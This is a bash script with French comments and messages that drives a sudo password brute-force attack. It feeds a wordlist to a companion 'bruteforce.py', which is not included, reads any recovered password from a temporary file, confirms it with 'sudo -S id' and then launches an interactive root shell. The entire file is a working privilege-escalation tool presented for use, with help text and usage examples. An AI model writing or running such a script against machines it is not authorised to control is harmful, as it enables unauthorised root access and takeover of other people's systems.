#!/bin/bash

# Variables
VERBOSE=0
WORDLIST=""

# Afficher l'aide
show_help() {
    echo "Usage: $0 [OPTIONS] <wordlist>"
    echo ""
    echo "Options:"
    echo "  -v, --verbose    Afficher la liste des mots de passe testés en temps réel"
    echo "  -h, --help       Afficher ce message d'aide"
    echo ""
    echo "Exemples:"
    echo "  $0 wordlist.txt          Bruteforce simple"
    echo "  $0 --verbose wordlist.txt  Mode verbeux avec affichage détaillé"
    exit 0
}

# Parser les arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            VERBOSE=1
            shift
            ;;
        -h|--help)
            show_help
            ;;
        *)
            WORDLIST="$1"
            shift
            ;;
    esac
done

# Vérifications
[ -z "$WORDLIST" ] && echo "❌ Usage: $0 <wordlist>" && echo "   Utilisez $0 --help pour plus d'options" && exit 1
[ ! -f "$WORDLIST" ] && echo "❌ Wordlist $WORDLIST non trouvé" && exit 1

echo "🔍 Bruteforce en cours..."
echo "📁 Wordlist: $WORDLIST"
[ $VERBOSE -eq 1 ] && echo "📊 Mode verbose: ACTIVÉ" || echo "📊 Mode verbose: DÉSACTIVÉ"
echo ""

# Nettoyer le fichier temporaire précédent
rm -f /tmp/sudo_password.txt

# Exécuter en mode verbose ou normal
if [ $VERBOSE -eq 1 ]; then
    # Mode verbose
    echo "📋 Liste des mots de passe testés (défilement en direct):"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # Exécuter le script Python en mode verbose
    python3 -u bruteforce.py --wordlist "$WORDLIST" --verbose
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
else
    # Mode normal
    echo "⏳ Test en cours (mode silencieux)..."
    python3 -u bruteforce.py --wordlist "$WORDLIST" 2>/dev/null
fi

# Vérifier si un mot de passe a été trouvé
if [ -f /tmp/sudo_password.txt ]; then
    password=$(cat /tmp/sudo_password.txt | tr -d '\n\r' | xargs)
    rm -f /tmp/sudo_password.txt
    
    if [ ! -z "$password" ]; then
        echo ""
        echo "🎉 MOT DE PASSE TROUVÉ: '$password'"
        echo "🐚 Ouverture du shell root..."
        
        # Tester le mot de passe
        if echo "$password" | sudo -S id > /dev/null 2>&1; then
            echo "✅ Accès root confirmé !"
            echo "🚀 Lancement du shell root..."
            # Lancer un shell root interactif
            sudo -i
        else
            echo "❌ Le mot de passe ne fonctionne pas pour sudo"
            echo "   Essayez manuellement: sudo su"
            echo "   Mot de passe: $password"
            exit 1
        fi
    else
        echo "❌ Aucun mot de passe trouvé dans la wordlist"
        exit 1
    fi
else
    echo "❌ Aucun mot de passe trouvé dans la wordlist"
    exit 1
fi
